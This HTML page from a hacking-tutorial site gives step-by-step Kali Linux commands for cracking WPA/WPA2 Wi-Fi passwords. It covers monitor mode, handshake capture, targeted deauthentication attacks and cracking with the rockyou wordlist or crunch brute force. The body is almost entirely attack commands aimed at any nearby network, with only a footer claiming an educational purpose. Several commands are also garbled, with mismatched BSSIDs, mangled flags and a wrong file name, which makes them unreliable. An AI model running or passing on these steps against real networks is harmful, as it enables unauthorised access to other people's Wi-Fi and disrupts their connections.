<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Crack WPA/WPA2 Encryption</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="1.  Start kali linux and open terminal in kali linux.

2.  Type command : airmon-ng

           (Check weather your wireless card is avilable and working properly)

3.  Type command : airmon-ng start wlan0

           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)

4.  Type command: airodump-ng mon0

            (command to listen to the wireless network around you and get details about them.)" />
	<meta name="keywords" content="Crack WPA,WPA2 Protected Wi-Fi with dictionery" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link href="css/93.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance547" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance548" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance552" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#bebebe;">How to Crack WPA/WPA2 Protected Wi-Fi with dictionery</span></h1>

<p> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1</strong>.  Start kali linux and open terminal in kali linux.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong>  Type command : airmon-ng</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (Check weather your wireless card is avilable and working properly)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong>  Type command : airmon-ng start wlan0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong>  Type command: airodump-ng mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">            (command to listen to the wireless network around you and get details about them.)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong>  Type command : airodump-ng –w File name of packet –c Target channel no --bssid BSSID of target name mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">               (  eg: airodump-ng –w MTNL –c 3 –bssid 11:22:33:44:55:66 mon0)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              (This means airodump-ng has successfully captured the handshake.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>6.</strong>  Type command: sudo aireplay-ng -0 5–a 11:22:33:44:55:66 mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              [Send directed DeAuth (attack is more effective when it is targeted) ].</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>7.</strong>  Type command:   aircrack-ng -w wordlist.lst -b 00:11:22:33:44:55 MTNL.cap</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">            [ -w=The name of the dictionary file</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">             -b=The MAC address of the access point</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              MTNL.cap=The name of the file that contains the authentication handshake ]</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">[<strong>Note:</strong> Default directory for wordlist in linux:  /usr/share/wordlists/rockyou.txt.gz]</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>Steps to attach dictionery</strong></span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong> cp /usr/share/wordlists/rockyou.txt.gz  (copy the file to root directory)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong> gunzIP rockyou.txt.gz    (UnzIP the file)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong> mv newrockyou.txt wordlist.lst    (rename the file from newrockyou to wordlist)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;">How to Crack WPA/WPA2 Protected Wi-Fi without dictionary</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong>  Start kali Linux and open terminal in kali Linux.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong>  Type command : airmon-ng</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (Check weather your wireless card is avilable and working properly)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong>  Type command : airmon-ng start wlan0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong>  Type command: airodump-ng mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">            (command to listen to the wireless network around you and get details about them.)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong>  Type command : airodump-ng –w File name of packet –c Target channel no  --bssid BSSID of target name mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">               (  eg: airodump-ng –w MTNL –c 3  - -bssid 11:22:33:44:55:66 mon0)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              (This means airodump-ng has successfully captured the handshake.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>6.</strong>  Type command: sudo aireplay-ng -0 5–a 11:22:33:44:55:66 mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              [Send directed DeAuth (attack is more effective when it is targeted) ].</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>7.</strong>  Type command:crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng  --bssid 11:22:33:44:55 :66  -w  MTNL.cap</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              <strong>[a).</strong>crunch: cruch is used to crack wifi without dictionary as crunch automatically generate the wordlists. working of crunch is similar to brute force attack. It try all possible combination referred by user to crack password.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              <strong>  b).</strong> 8 12=It indicates minimum length of password is 8 and maximum length of password is 12.it generate the       wordlist starting  with 8 character and maximum with 12 character.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">                <strong>c).</strong>wordlist contain all lowercase a-z, uppercase A-Z, Number 0-9 as user defined.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">                <strong>d).</strong>-bssid : specifies the target MAC address</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">                <strong>e).</strong> MTNL.cap is the handshake file on which client perform attack.</span></p>

<p> </p>
</div><div id="wb_element_instance553" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(93);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance553");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance553").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance549" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance550" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance551" class="wb_element"><div id="wb_element_instance551_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance551_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance551_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance551_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance551_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance551_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance551_toolbox"); }
			</script></div><div id="wb_element_instance554" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>